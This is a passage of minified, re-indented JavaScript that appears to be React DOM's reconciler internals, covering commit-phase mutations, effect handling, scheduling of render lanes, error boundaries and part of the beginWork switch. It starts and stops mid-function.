  default:
      Ye(e, t, n)
  }
}

function Us(e) {
  var t = e.updateQueue;
  if (t !== null) {
      e.updateQueue = null;
      var n = e.stateNode;
      n === null && (n = e.stateNode = new Pd), t.forEach(function (r) {
          var l = Hd.bind(null, e, r);
          n.has(r) || (n.add(r), r.then(l, l))
      })
  }
}

function ze(e, t) {
  var n = t.deletions;
  if (n !== null)
      for (var r = 0; r < n.length; r++) {
          var l = n[r];
          try {
              var o = e,
                  i = t,
                  u = i;
              e: for (; u !== null;) {
                  switch (u.tag) {
                  case 5:
                      ee = u.stateNode, Le = !1;
                      break e;
                  case 3:
                      ee = u.stateNode.containerInfo, Le = !0;
                      break e;
                  case 4:
                      ee = u.stateNode.containerInfo, Le = !0;
                      break e
                  }
                  u = u.return
              }
              if (ee === null) throw Error(g(160));
              Ja(o, i, l), ee = null, Le = !1;
              var a = l.alternate;
              a !== null && (a.return = null), l.return = null
          } catch (d) {
              W(l, t, d)
          }
      }
  if (t.subtreeFlags & 12854)
      for (t = t.child; t !== null;) ba(t, e), t = t.sibling
}

function ba(e, t) {
  var n = e.alternate,
      r = e.flags;
  switch (e.tag) {
  case 0:
  case 11:
  case 14:
  case 15:
      if (ze(t, e), Ae(e), r & 4) {
          try {
              Tn(3, e, e.return), hl(3, e)
          } catch (k) {
              W(e, e.return, k)
          }
          try {
              Tn(5, e, e.return)
          } catch (k) {
              W(e, e.return, k)
          }
      }
      break;
  case 1:
      ze(t, e), Ae(e), r & 512 && n !== null && Zt(n, n.return);
      break;
  case 5:
      if (ze(t, e), Ae(e), r & 512 && n !== null && Zt(n, n.return), e.flags & 32) {
          var l = e.stateNode;
          try {
              An(l, "")
          } catch (k) {
              W(e, e.return, k)
          }
      }
      if (r & 4 && (l = e.stateNode, l != null)) {
          var o = e.memoizedProps,
              i = n !== null ? n.memoizedProps : o,
              u = e.type,
              a = e.updateQueue;
          if (e.updateQueue = null, a !== null) try {
              u === "input" && o.type === "radio" && o.name != null && wu(l, o), ao(u, i);
              var d = ao(u, o);
              for (i = 0; i < a.length; i += 2) {
                  var v = a[i],
                      m = a[i + 1];
                  v === "style" ? _u(l, m) : v === "dangerouslySetInnerHTML" ? Su(l, m) : v === "children" ? An(l, m) : Yo(l, v, m, d)
              }
              switch (u) {
              case "input":
                  lo(l, o);
                  break;
              case "textarea":
                  ku(l, o);
                  break;
              case "select":
                  var h = l._wrapperState.wasMultiple;
                  l._wrapperState.wasMultiple = !!o.multiple;
                  var x = o.value;
                  x != null ? Gt(l, !!o.multiple, x, !1) : h !== !!o.multiple && (o.defaultValue != null ? Gt(l, !!o.multiple, o.defaultValue, !0) : Gt(l, !!o.multiple, o.multiple ? [] : "", !1))
              }
              l[qn] = o
          } catch (k) {
              W(e, e.return, k)
          }
      }
      break;
  case 6:
      if (ze(t, e), Ae(e), r & 4) {
          if (e.stateNode === null) throw Error(g(162));
          l = e.stateNode, o = e.memoizedProps;
          try {
              l.nodeValue = o
          } catch (k) {
              W(e, e.return, k)
          }
      }
      break;
  case 3:
      if (ze(t, e), Ae(e), r & 4 && n !== null && n.memoizedState.isDehydrated) try {
          Vn(t.containerInfo)
      } catch (k) {
          W(e, e.return, k)
      }
      break;
  case 4:
      ze(t, e), Ae(e);
      break;
  case 13:
      ze(t, e), Ae(e), l = e.child, l.flags & 8192 && (o = l.memoizedState !== null, l.stateNode.isHidden = o, !o || l.alternate !== null && l.alternate.memoizedState !== null || (Mi = Z())), r & 4 && Us(e);
      break;
  case 22:
      if (v = n !== null && n.memoizedState !== null, e.mode & 1 ? (oe = (d = oe) || v, ze(t, e), oe = d) : ze(t, e), Ae(e), r & 8192) {
          if (d = e.memoizedState !== null, (e.stateNode.isHidden = d) && !v && e.mode & 1)
              for (j = e, v = e.child; v !== null;) {
                  for (m = j = v; j !== null;) {
                      switch (h = j, x = h.child, h.tag) {
                      case 0:
                      case 11:
                      case 14:
                      case 15:
                          Tn(4, h, h.return);
                          break;
                      case 1:
                          Zt(h, h.return);
                          var w = h.stateNode;
                          if (typeof w.componentWillUnmount == "function") {
                              r = h, n = h.return;
                              try {
                                  t = r, w.props = t.memoizedProps, w.state = t.memoizedState, w.componentWillUnmount()
                              } catch (k) {
                                  W(r, n, k)
                              }
                          }
                          break;
                      case 5:
                          Zt(h, h.return);
                          break;
                      case 22:
                          if (h.memoizedState !== null) {
                              $s(m);
                              continue
                          }
                      }
                      x !== null ? (x.return = h, j = x) : $s(m)
                  }
                  v = v.sibling
              }
          e: for (v = null, m = e;;) {
              if (m.tag === 5) {
                  if (v === null) {
                      v = m;
                      try {
                          l = m.stateNode, d ? (o = l.style, typeof o.setProperty == "function" ? o.setProperty("display", "none", "important") : o.display = "none") : (u = m.stateNode, a = m.memoizedProps.style, i = a != null && a.hasOwnProperty("display") ? a.display : null, u.style.display = Cu("display", i))
                      } catch (k) {
                          W(e, e.return, k)
                      }
                  }
              } else if (m.tag === 6) {
                  if (v === null) try {
                      m.stateNode.nodeValue = d ? "" : m.memoizedProps
                  } catch (k) {
                      W(e, e.return, k)
                  }
              } else if ((m.tag !== 22 && m.tag !== 23 || m.memoizedState === null || m === e) && m.child !== null) {
                  m.child.return = m, m = m.child;
                  continue
              }
              if (m === e) break e;
              for (; m.sibling === null;) {
                  if (m.return === null || m.return === e) break e;
                  v === m && (v = null), m = m.return
              }
              v === m && (v = null), m.sibling.return = m.return, m = m.sibling
          }
      }
      break;
  case 19:
      ze(t, e), Ae(e), r & 4 && Us(e);
      break;
  case 21:
      break;
  default:
      ze(t, e), Ae(e)
  }
}

function Ae(e) {
  var t = e.flags;
  if (t & 2) {
      try {
          e: {
              for (var n = e.return; n !== null;) {
                  if (Ya(n)) {
                      var r = n;
                      break e
                  }
                  n = n.return
              }
              throw Error(g(160))
          }
          switch (r.tag) {
          case 5:
              var l = r.stateNode;
              r.flags & 32 && (An(l, ""), r.flags &= -33);
              var o = Vs(e);
              Vo(e, o, l);
              break;
          case 3:
          case 4:
              var i = r.stateNode.containerInfo,
                  u = Vs(e);
              Fo(e, u, i);
              break;
          default:
              throw Error(g(161))
          }
      }
      catch (a) {
          W(e, e.return, a)
      }
      e.flags &= -3
  }
  t & 4096 && (e.flags &= -4097)
}

function Md(e, t, n) {
  j = e, ec(e)
}

function ec(e, t, n) {
  for (var r = (e.mode & 1) !== 0; j !== null;) {
      var l = j,
          o = l.child;
      if (l.tag === 22 && r) {
          var i = l.memoizedState !== null || wr;
          if (!i) {
              var u = l.alternate,
                  a = u !== null && u.memoizedState !== null || oe;
              u = wr;
              var d = oe;
              if (wr = i, (oe = a) && !d)
                  for (j = l; j !== null;) i = j, a = i.child, i.tag === 22 && i.memoizedState !== null ? Ws(l) : a !== null ? (a.return = i, j = a) : Ws(l);
              for (; o !== null;) j = o, ec(o), o = o.sibling;
              j = l, wr = u, oe = d
          }
          Bs(e)
      } else l.subtreeFlags & 8772 && o !== null ? (o.return = l, j = o) : Bs(e)
  }
}

function Bs(e) {
  for (; j !== null;) {
      var t = j;
      if (t.flags & 8772) {
          var n = t.alternate;
          try {
              if (t.flags & 8772) switch (t.tag) {
              case 0:
              case 11:
              case 15:
                  oe || hl(5, t);
                  break;
              case 1:
                  var r = t.stateNode;
                  if (t.flags & 4 && !oe)
                      if (n === null) r.componentDidMount();
                      else {
                          var l = t.elementType === t.type ? n.memoizedProps : Me(t.type, n.memoizedProps);
                          r.componentDidUpdate(l, n.memoizedState, r.__reactInternalSnapshotBeforeUpdate)
                      } var o = t.updateQueue;
                  o !== null && _s(t, o, r);
                  break;
              case 3:
                  var i = t.updateQueue;
                  if (i !== null) {
                      if (n = null, t.child !== null) switch (t.child.tag) {
                      case 5:
                          n = t.child.stateNode;
                          break;
                      case 1:
                          n = t.child.stateNode
                      }
                      _s(t, i, n)
                  }
                  break;
              case 5:
                  var u = t.stateNode;
                  if (n === null && t.flags & 4) {
                      n = u;
                      var a = t.memoizedProps;
                      switch (t.type) {
                      case "button":
                      case "input":
                      case "select":
                      case "textarea":
                          a.autoFocus && n.focus();
                          break;
                      case "img":
                          a.src && (n.src = a.src)
                      }
                  }
                  break;
              case 6:
                  break;
              case 4:
                  break;
              case 12:
                  break;
              case 13:
                  if (t.memoizedState === null) {
                      var d = t.alternate;
                      if (d !== null) {
                          var v = d.memoizedState;
                          if (v !== null) {
                              var m = v.dehydrated;
                              m !== null && Vn(m)
                          }
                      }
                  }
                  break;
              case 19:
              case 17:
              case 21:
              case 22:
              case 23:
              case 25:
                  break;
              default:
                  throw Error(g(163))
              }
              oe || t.flags & 512 && Ho(t)
          } catch (h) {
              W(t, t.return, h)
          }
      }
      if (t === e) {
          j = null;
          break
      }
      if (n = t.sibling, n !== null) {
          n.return = t.return, j = n;
          break
      }
      j = t.return
  }
}

function $s(e) {
  for (; j !== null;) {
      var t = j;
      if (t === e) {
          j = null;
          break
      }
      var n = t.sibling;
      if (n !== null) {
          n.return = t.return, j = n;
          break
      }
      j = t.return
  }
}

function Ws(e) {
  for (; j !== null;) {
      var t = j;
      try {
          switch (t.tag) {
          case 0:
          case 11:
          case 15:
              var n = t.return;
              try {
                  hl(4, t)
              } catch (a) {
                  W(t, n, a)
              }
              break;
          case 1:
              var r = t.stateNode;
              if (typeof r.componentDidMount == "function") {
                  var l = t.return;
                  try {
                      r.componentDidMount()
                  } catch (a) {
                      W(t, l, a)
                  }
              }
              var o = t.return;
              try {
                  Ho(t)
              } catch (a) {
                  W(t, o, a)
              }
              break;
          case 5:
              var i = t.return;
              try {
                  Ho(t)
              } catch (a) {
                  W(t, i, a)
              }
          }
      } catch (a) {
          W(t, t.return, a)
      }
      if (t === e) {
          j = null;
          break
      }
      var u = t.sibling;
      if (u !== null) {
          u.return = t.return, j = u;
          break
      }
      j = t.return
  }
}
var Ld = Math.ceil,
  el = Xe.ReactCurrentDispatcher,
  Pi = Xe.ReactCurrentOwner,
  _e = Xe.ReactCurrentBatchConfig,
  R = 0,
  b = null,
  K = null,
  te = 0,
  ve = 0,
  Kt = yt(0),
  X = 0,
  Yn = null,
  Lt = 0,
  ml = 0,
  zi = 0,
  Rn = null,
  de = null,
  Mi = 0,
  un = 1 / 0,
  Ue = null,
  tl = !1,
  Uo = null,
  dt = null,
  kr = !1,
  lt = null,
  nl = 0,
  In = 0,
  Bo = null,
  Tr = -1,
  Rr = 0;

function ue() {
  return R & 6 ? Z() : Tr !== -1 ? Tr : Tr = Z()
}

function ft(e) {
  return e.mode & 1 ? R & 2 && te !== 0 ? te & -te : hd.transition !== null ? (Rr === 0 && (Rr = Ou()), Rr) : (e = I, e !== 0 || (e = window.event, e = e === void 0 ? 16 : Wu(e.type)), e) : 1
}

function Ie(e, t, n, r) {
  if (50 < In) throw In = 0, Bo = null, Error(g(185));
  er(e, n, r), (!(R & 2) || e !== b) && (e === b && (!(R & 2) && (ml |= n), X === 4 && nt(e, te)), me(e, r), n === 1 && R === 0 && !(t.mode & 1) && (un = Z() + 500, dl && gt()))
}

function me(e, t) {
  var n = e.callbackNode;
  h1(e, t);
  var r = Fr(e, e === b ? te : 0);
  if (r === 0) n !== null && bi(n), e.callbackNode = null, e.callbackPriority = 0;
  else if (t = r & -r, e.callbackPriority !== t) {
      if (n != null && bi(n), t === 1) e.tag === 0 ? pd(qs.bind(null, e)) : aa(qs.bind(null, e)), ad(function () {
          !(R & 6) && gt()
      }), n = null;
      else {
          switch (Hu(r)) {
          case 1:
              n = ni;
              break;
          case 4:
              n = Du;
              break;
          case 16:
              n = Hr;
              break;
          case 536870912:
              n = Au;
              break;
          default:
              n = Hr
          }
          n = uc(n, tc.bind(null, e))
      }
      e.callbackPriority = t, e.callbackNode = n
  }
}

function tc(e, t) {
  if (Tr = -1, Rr = 0, R & 6) throw Error(g(327));
  var n = e.callbackNode;
  if (en() && e.callbackNode !== n) return null;
  var r = Fr(e, e === b ? te : 0);
  if (r === 0) return null;
  if (r & 30 || r & e.expiredLanes || t) t = rl(e, r);
  else {
      t = r;
      var l = R;
      R |= 2;
      var o = rc();
      (b !== e || te !== t) && (Ue = null, un = Z() + 500, Nt(e, t));
      do try {
          Id();
          break
      } catch (u) {
          nc(e, u)
      }
      while (!0);
      mi(), el.current = o, R = l, K !== null ? t = 0 : (b = null, te = 0, t = X)
  }
  if (t !== 0) {
      if (t === 2 && (l = mo(e), l !== 0 && (r = l, t = $o(e, l))), t === 1) throw n = Yn, Nt(e, 0), nt(e, r), me(e, Z()), n;
      if (t === 6) nt(e, r);
      else {
          if (l = e.current.alternate, !(r & 30) && !Td(l) && (t = rl(e, r), t === 2 && (o = mo(e), o !== 0 && (r = o, t = $o(e, o))), t === 1)) throw n = Yn, Nt(e, 0), nt(e, r), me(e, Z()), n;
          switch (e.finishedWork = l, e.finishedLanes = r, t) {
          case 0:
          case 1:
              throw Error(g(345));
          case 2:
              jt(e, de, Ue);
              break;
          case 3:
              if (nt(e, r), (r & 130023424) === r && (t = Mi + 500 - Z(), 10 < t)) {
                  if (Fr(e, 0) !== 0) break;
                  if (l = e.suspendedLanes, (l & r) !== r) {
                      ue(), e.pingedLanes |= e.suspendedLanes & l;
                      break
                  }
                  e.timeoutHandle = So(jt.bind(null, e, de, Ue), t);
                  break
              }
              jt(e, de, Ue);
              break;
          case 4:
              if (nt(e, r), (r & 4194240) === r) break;
              for (t = e.eventTimes, l = -1; 0 < r;) {
                  var i = 31 - Re(r);
                  o = 1 << i, i = t[i], i > l && (l = i), r &= ~o
              }
              if (r = l, r = Z() - r, r = (120 > r ? 120 : 480 > r ? 480 : 1080 > r ? 1080 : 1920 > r ? 1920 : 3e3 > r ? 3e3 : 4320 > r ? 4320 : 1960 * Ld(r / 1960)) - r, 10 < r) {
                  e.timeoutHandle = So(jt.bind(null, e, de, Ue), r);
                  break
              }
              jt(e, de, Ue);
              break;
          case 5:
              jt(e, de, Ue);
              break;
          default:
              throw Error(g(329))
          }
      }
  }
  return me(e, Z()), e.callbackNode === n ? tc.bind(null, e) : null
}

function $o(e, t) {
  var n = Rn;
  return e.current.memoizedState.isDehydrated && (Nt(e, t).flags |= 256), e = rl(e, t), e !== 2 && (t = de, de = n, t !== null && Wo(t)), e
}

function Wo(e) {
  de === null ? de = e : de.push.apply(de, e)
}

function Td(e) {
  for (var t = e;;) {
      if (t.flags & 16384) {
          var n = t.updateQueue;
          if (n !== null && (n = n.stores, n !== null))
              for (var r = 0; r < n.length; r++) {
                  var l = n[r],
                      o = l.getSnapshot;
                  l = l.value;
                  try {
                      if (!De(o(), l)) return !1
                  } catch {
                      return !1
                  }
              }
      }
      if (n = t.child, t.subtreeFlags & 16384 && n !== null) n.return = t, t = n;
      else {
          if (t === e) break;
          for (; t.sibling === null;) {
              if (t.return === null || t.return === e) return !0;
              t = t.return
          }
          t.sibling.return = t.return, t = t.sibling
      }
  }
  return !0
}

function nt(e, t) {
  for (t &= ~zi, t &= ~ml, e.suspendedLanes |= t, e.pingedLanes &= ~t, e = e.expirationTimes; 0 < t;) {
      var n = 31 - Re(t),
          r = 1 << n;
      e[n] = -1, t &= ~r
  }
}

function qs(e) {
  if (R & 6) throw Error(g(327));
  en();
  var t = Fr(e, 0);
  if (!(t & 1)) return me(e, Z()), null;
  var n = rl(e, t);
  if (e.tag !== 0 && n === 2) {
      var r = mo(e);
      r !== 0 && (t = r, n = $o(e, r))
  }
  if (n === 1) throw n = Yn, Nt(e, 0), nt(e, t), me(e, Z()), n;
  if (n === 6) throw Error(g(345));
  return e.finishedWork = e.current.alternate, e.finishedLanes = t, jt(e, de, Ue), me(e, Z()), null
}

function Li(e, t) {
  var n = R;
  R |= 1;
  try {
      return e(t)
  } finally {
      R = n, R === 0 && (un = Z() + 500, dl && gt())
  }
}

function Tt(e) {
  lt !== null && lt.tag === 0 && !(R & 6) && en();
  var t = R;
  R |= 1;
  var n = _e.transition,
      r = I;
  try {
      if (_e.transition = null, I = 1, e) return e()
  } finally {
      I = r, _e.transition = n, R = t, !(R & 6) && gt()
  }
}

function Ti() {
  ve = Kt.current, F(Kt)
}

function Nt(e, t) {
  e.finishedWork = null, e.finishedLanes = 0;
  var n = e.timeoutHandle;
  if (n !== -1 && (e.timeoutHandle = -1, ud(n)), K !== null)
      for (n = K.return; n !== null;) {
          var r = n;
          switch (fi(r), r.tag) {
          case 1:
              r = r.type.childContextTypes, r != null && Wr();
              break;
          case 3:
              on(), F(pe), F(ie), ki();
              break;
          case 5:
              wi(r);
              break;
          case 4:
              on();
              break;
          case 13:
              F(U);
              break;
          case 19:
              F(U);
              break;
          case 10:
              vi(r.type._context);
              break;
          case 22:
          case 23:
              Ti()
          }
          n = n.return
      }
  if (b = e, K = e = pt(e.current, null), te = ve = t, X = 0, Yn = null, zi = ml = Lt = 0, de = Rn = null, Ct !== null) {
      for (t = 0; t < Ct.length; t++)
          if (n = Ct[t], r = n.interleaved, r !== null) {
              n.interleaved = null;
              var l = r.next,
                  o = n.pending;
              if (o !== null) {
                  var i = o.next;
                  o.next = l, r.next = i
              }
              n.pending = r
          } Ct = null
  }
  return e
}

function nc(e, t) {
  do {
      var n = K;
      try {
          if (mi(), zr.current = br, Jr) {
              for (var r = B.memoizedState; r !== null;) {
                  var l = r.queue;
                  l !== null && (l.pending = null), r = r.next
              }
              Jr = !1
          }
          if (Mt = 0, J = G = B = null, Ln = !1, Kn = 0, Pi.current = null, n === null || n.return === null) {
              X = 1, Yn = t, K = null;
              break
          }
          e: {
              var o = e,
                  i = n.return,
                  u = n,
                  a = t;
              if (t = te, u.flags |= 32768, a !== null && typeof a == "object" && typeof a.then == "function") {
                  var d = a,
                      v = u,
                      m = v.tag;
                  if (!(v.mode & 1) && (m === 0 || m === 11 || m === 15)) {
                      var h = v.alternate;
                      h ? (v.updateQueue = h.updateQueue, v.memoizedState = h.memoizedState, v.lanes = h.lanes) : (v.updateQueue = null, v.memoizedState = null)
                  }
                  var x = Ts(i);
                  if (x !== null) {
                      x.flags &= -257, Rs(x, i, u, o, t), x.mode & 1 && Ls(o, d, t), t = x, a = d;
                      var w = t.updateQueue;
                      if (w === null) {
                          var k = new Set;
                          k.add(a), t.updateQueue = k
                      } else w.add(a);
                      break e
                  } else {
                      if (!(t & 1)) {
                          Ls(o, d, t), Ri();
                          break e
                      }
                      a = Error(g(426))
                  }
              } else if (V && u.mode & 1) {
                  var D = Ts(i);
                  if (D !== null) {
                      !(D.flags & 65536) && (D.flags |= 256), Rs(D, i, u, o, t), pi(sn(a, u));
                      break e
                  }
              }
              o = a = sn(a, u),
              X !== 4 && (X = 2),
              Rn === null ? Rn = [o] : Rn.push(o),
              o = i;do {
                  switch (o.tag) {
                  case 3:
                      o.flags |= 65536, t &= -t, o.lanes |= t;
                      var f = Fa(o, a, t);
                      Cs(o, f);
                      break e;
                  case 1:
                      u = a;
                      var c = o.type,
                          p = o.stateNode;
                      if (!(o.flags & 128) && (typeof c.getDerivedStateFromError == "function" || p !== null && typeof p.componentDidCatch == "function" && (dt === null || !dt.has(p)))) {
                          o.flags |= 65536, t &= -t, o.lanes |= t;
                          var y = Va(o, u, t);
                          Cs(o, y);
                          break e
                      }
                  }
                  o = o.return
              } while (o !== null)
          }
          oc(n)
      } catch (S) {
          t = S, K === n && n !== null && (K = n = n.return);
          continue
      }
      break
  } while (!0)
}

function rc() {
  var e = el.current;
  return el.current = br, e === null ? br : e
}

function Ri() {
  (X === 0 || X === 3 || X === 2) && (X = 4), b === null || !(Lt & 268435455) && !(ml & 268435455) || nt(b, te)
}

function rl(e, t) {
  var n = R;
  R |= 2;
  var r = rc();
  (b !== e || te !== t) && (Ue = null, Nt(e, t));
  do try {
      Rd();
      break
  } catch (l) {
      nc(e, l)
  }
  while (!0);
  if (mi(), R = n, el.current = r, K !== null) throw Error(g(261));
  return b = null, te = 0, X
}

function Rd() {
  for (; K !== null;) lc(K)
}

function Id() {
  for (; K !== null && !o1();) lc(K)
}

function lc(e) {
  var t = sc(e.alternate, e, ve);
  e.memoizedProps = e.pendingProps, t === null ? oc(e) : K = t, Pi.current = null
}

function oc(e) {
  var t = e;
  do {
      var n = t.alternate;
      if (e = t.return, t.flags & 32768) {
          if (n = Ed(n, t), n !== null) {
              n.flags &= 32767, K = n;
              return
          }
          if (e !== null) e.flags |= 32768, e.subtreeFlags = 0, e.deletions = null;
          else {
              X = 6, K = null;
              return
          }
      } else if (n = Nd(n, t, ve), n !== null) {
          K = n;
          return
      }
      if (t = t.sibling, t !== null) {
          K = t;
          return
      }
      K = t = e
  } while (t !== null);
  X === 0 && (X = 5)
}

function jt(e, t, n) {
  var r = I,
      l = _e.transition;
  try {
      _e.transition = null, I = 1, Dd(e, t, n, r)
  } finally {
      _e.transition = l, I = r
  }
  return null
}

function Dd(e, t, n, r) {
  do en(); while (lt !== null);
  if (R & 6) throw Error(g(327));
  n = e.finishedWork;
  var l = e.finishedLanes;
  if (n === null) return null;
  if (e.finishedWork = null, e.finishedLanes = 0, n === e.current) throw Error(g(177));
  e.callbackNode = null, e.callbackPriority = 0;
  var o = n.lanes | n.childLanes;
  if (m1(e, o), e === b && (K = b = null, te = 0), !(n.subtreeFlags & 2064) && !(n.flags & 2064) || kr || (kr = !0, uc(Hr, function () {
          return en(), null
      })), o = (n.flags & 15990) !== 0, n.subtreeFlags & 15990 || o) {
      o = _e.transition, _e.transition = null;
      var i = I;
      I = 1;
      var u = R;
      R |= 4, Pi.current = null, zd(e, n), ba(n, e), td(ko), Vr = !!wo, ko = wo = null, e.current = n, Md(n), i1(), R = u, I = i, _e.transition = o
  } else e.current = n;
  if (kr && (kr = !1, lt = e, nl = l), o = e.pendingLanes, o === 0 && (dt = null), a1(n.stateNode), me(e, Z()), t !== null)
      for (r = e.onRecoverableError, n = 0; n < t.length; n++) l = t[n], r(l.value, {
          componentStack: l.stack,
          digest: l.digest
      });
  if (tl) throw tl = !1, e = Uo, Uo = null, e;
  return nl & 1 && e.tag !== 0 && en(), o = e.pendingLanes, o & 1 ? e === Bo ? In++ : (In = 0, Bo = e) : In = 0, gt(), null
}

function en() {
  if (lt !== null) {
      var e = Hu(nl),
          t = _e.transition,
          n = I;
      try {
          if (_e.transition = null, I = 16 > e ? 16 : e, lt === null) var r = !1;
          else {
              if (e = lt, lt = null, nl = 0, R & 6) throw Error(g(331));
              var l = R;
              for (R |= 4, j = e.current; j !== null;) {
                  var o = j,
                      i = o.child;
                  if (j.flags & 16) {
                      var u = o.deletions;
                      if (u !== null) {
                          for (var a = 0; a < u.length; a++) {
                              var d = u[a];
                              for (j = d; j !== null;) {
                                  var v = j;
                                  switch (v.tag) {
                                  case 0:
                                  case 11:
                                  case 15:
                                      Tn(8, v, o)
                                  }
                                  var m = v.child;
                                  if (m !== null) m.return = v, j = m;
                                  else
                                      for (; j !== null;) {
                                          v = j;
                                          var h = v.sibling,
                                              x = v.return;
                                          if (Xa(v), v === d) {
                                              j = null;
                                              break
                                          }
                                          if (h !== null) {
                                              h.return = x, j = h;
                                              break
                                          }
                                          j = x
                                      }
                              }
                          }
                          var w = o.alternate;
                          if (w !== null) {
                              var k = w.child;
                              if (k !== null) {
                                  w.child = null;
                                  do {
                                      var D = k.sibling;
                                      k.sibling = null, k = D
                                  } while (k !== null)
                              }
                          }
                          j = o
                      }
                  }
                  if (o.subtreeFlags & 2064 && i !== null) i.return = o, j = i;
                  else e: for (; j !== null;) {
                      if (o = j, o.flags & 2048) switch (o.tag) {
                      case 0:
                      case 11:
                      case 15:
                          Tn(9, o, o.return)
                      }
                      var f = o.sibling;
                      if (f !== null) {
                          f.return = o.return, j = f;
                          break e
                      }
                      j = o.return
                  }
              }
              var c = e.current;
              for (j = c; j !== null;) {
                  i = j;
                  var p = i.child;
                  if (i.subtreeFlags & 2064 && p !== null) p.return = i, j = p;
                  else e: for (i = c; j !== null;) {
                      if (u = j, u.flags & 2048) try {
                          switch (u.tag) {
                          case 0:
                          case 11:
                          case 15:
                              hl(9, u)
                          }
                      } catch (S) {
                          W(u, u.return, S)
                      }
                      if (u === i) {
                          j = null;
                          break e
                      }
                      var y = u.sibling;
                      if (y !== null) {
                          y.return = u.return, j = y;
                          break e
                      }
                      j = u.return
                  }
              }
              if (R = l, gt(), Fe && typeof Fe.onPostCommitFiberRoot == "function") try {
                  Fe.onPostCommitFiberRoot(il, e)
              } catch {}
              r = !0
          }
          return r
      } finally {
          I = n, _e.transition = t
      }
  }
  return !1
}

function Qs(e, t, n) {
  t = sn(n, t), t = Fa(e, t, 1), e = ct(e, t, 1), t = ue(), e !== null && (er(e, 1, t), me(e, t))
}

function W(e, t, n) {
  if (e.tag === 3) Qs(e, e, n);
  else
      for (; t !== null;) {
          if (t.tag === 3) {
              Qs(t, e, n);
              break
          } else if (t.tag === 1) {
              var r = t.stateNode;
              if (typeof t.type.getDerivedStateFromError == "function" || typeof r.componentDidCatch == "function" && (dt === null || !dt.has(r))) {
                  e = sn(n, e), e = Va(t, e, 1), t = ct(t, e, 1), e = ue(), t !== null && (er(t, 1, e), me(t, e));
                  break
              }
          }
          t = t.return
      }
}

function Ad(e, t, n) {
  var r = e.pingCache;
  r !== null && r.delete(t), t = ue(), e.pingedLanes |= e.suspendedLanes & n, b === e && (te & n) === n && (X === 4 || X === 3 && (te & 130023424) === te && 500 > Z() - Mi ? Nt(e, 0) : zi |= n), me(e, t)
}

function ic(e, t) {
  t === 0 && (e.mode & 1 ? (t = dr, dr <<= 1, !(dr & 130023424) && (dr = 4194304)) : t = 1);
  var n = ue();
  e = Ke(e, t), e !== null && (er(e, t, n), me(e, n))
}

function Od(e) {
  var t = e.memoizedState,
      n = 0;
  t !== null && (n = t.retryLane), ic(e, n)
}

function Hd(e, t) {
  var n = 0;
  switch (e.tag) {
  case 13:
      var r = e.stateNode,
          l = e.memoizedState;
      l !== null && (n = l.retryLane);
      break;
  case 19:
      r = e.stateNode;
      break;
  default:
      throw Error(g(314))
  }
  r !== null && r.delete(t), ic(e, n)
}
var sc;
sc = function (e, t, n) {
  if (e !== null)
      if (e.memoizedProps !== t.pendingProps || pe.current) fe = !0;
      else {
          if (!(e.lanes & n) && !(t.flags & 128)) return fe = !1, _d(e, t, n);
          fe = !!(e.flags & 131072)
      }
  else fe = !1, V && t.flags & 1048576 && ca(t, Zr, t.index);
  switch (t.lanes = 0, t.tag) {
  case 2:
      var r = t.type;
      Lr(e, t), e = t.pendingProps;
      var l = nn(t, ie.current);
      bt(t, n), l = Si(null, t, r, e, l, n);
      var o = Ci();
      return t.flags |= 1, typeof l == "object" && l !== null && typeof l.render == "function" && l.$$typeof === void 0 ? (t.tag = 1, t.memoizedState = null, t.updateQueue = null, he(r) ? (o = !0, qr(t)) : o = !1, t.memoizedState = l.state !== null && l.state !== void 0 ? l.state : null, gi(t), l.updater = fl, t.stateNode = l, l._reactInternals = t, Mo(t, r, e, n), t = Ro(null, t, r, !0, o, n)) : (t.tag = 0, V && o && di(t), se(null, t, l, n), t = t.child), t;
  case 16:
      r = t.elementType;
      e: {
          switch (Lr(e, t), e = t.pendingProps, l = r._init, r = l(r._payload), t.type = r, l = t.tag = Vd(r), e = Me(r, e), l) {
          case 0:
              t = To(null, t, r, e, n);
              break e;
          case 1:
              t = As(null, t, r, e, n);
              break e;
          case 11:
              t = Is(null, t, r, e, n);
              break e;
          case 14:
              t = Ds(null, t, r, Me(r.type, e), n);
              break e
          }
          throw Error(g(306, r, ""))
      }
      return t;
  case 0:
      return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Me(r, l), To(e, t, r, l, n);
  case 1:
      return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Me(r, l), As(e, t, r, l, n);
  case 3:
      e: {
          if (Wa(t), e === null) throw Error(g(387));r = t.pendingProps,
          o = t.memoizedState,
          l = o.element,
          ha(e, t),
          Xr(t, r, null, n);
          var i = t.memoizedState;
          if (r = i.element, o.isDehydrated)
              if (o = {
                      element: r,
                      isDehydrated: !1,
                      cache: i.cache,
                      pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
                      transitions: i.transitions
                  }, t.updateQueue.baseState = o, t.memoizedState = o, t.flags & 256) {
                  l = sn(Error(g(423)), t), t = Os(e, t, r, n, l);
                  break e
              } else if (r !== l) {
              l = sn(Error(g(424)), t), t = Os(e, t, r, n, l);
              break e
          } else
              for (ye = at(t.stateNode.containerInfo.firstChild), ge = t, V = !0, Te = null, n = ga(t, null, r, n), t.child = n; n;) n.flags = n.flags & -3 | 4096, n = n.sibling;
          else {
              if (rn(), r === l) {
                  t = Ge(e, t, n);
                  break e
              }
              se(e, t, r, n)
          }
          t = t.child
      }
      return t;
  case 5:
      return xa(t), e === null && Eo(t), r = t.type, l = t.pendingProps, o = e !== null ? e.memoizedProps : null, i = l.children, jo(r, l) ? i = null : o !== null && jo(r, o) && (t.flags |= 32), $a(e, t), se(e, t, i, n), t.child;
  case 6:
      return e === null && Eo(t), null;
  case 13:
      return qa(e, t, n);
  case 4:
      return xi(t, t.stateNode.containerInfo), r = t.pendingProps, e === null ? t.child = ln(t, null, r, n) : se(e, t, r, n), t.child;
  case 11:
      return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Me(r, l), Is(e, t, r, l, n);
  case 7:
      return se(e, t, t.pendingProps, n), t.child;
  case 8:
      return se(e, t, t.pendingProps.children, n), t.child;
  case 12:
      return se(e, t, t.pendingProps.children, n), t.child;
  case 10:
      e: {
          if (r = t.type._context, l = t.pendingProps, o = t.memoizedProps, i = l.value, A(Kr, r._currentValue), r._currentValue = i, o !== null)
              if (De(o.value, i)) {
                  if (o.children === l.children && !pe.current) {
                      t = Ge(e, t, n);
                      break e
                  }
              } else
                  for (o = t.child, o !== null && (o.return = t); o !== null;) {
                      var u = o.dependencies;
                      if (u !== null) {
                          i = o.child;
                          for (var a = u.firstContext; a !== null;) {
